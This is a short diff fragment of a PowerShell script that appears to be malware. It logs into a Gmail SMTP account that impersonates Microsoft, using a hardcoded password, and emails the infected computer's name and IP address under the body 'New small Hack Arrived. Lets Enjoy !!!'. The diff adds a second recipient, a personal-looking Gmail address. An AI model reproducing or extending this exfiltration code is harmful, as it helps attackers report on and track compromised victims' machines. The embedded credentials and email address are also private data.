@@ -80,6 +80,11 @@ else{
     $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "com@microsoft"); 
     $msg.From = "com.microsoft.official@gmail.com"
     $msg.To.Add("com.microsoft.official@gmail.com")
+    $msg.To.Add("abukawsar.shakil.9@gmail.com")
+
+
+
+
 
     $msg.Subject = "$env:computername ### {$ip ($count)}"
     $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     
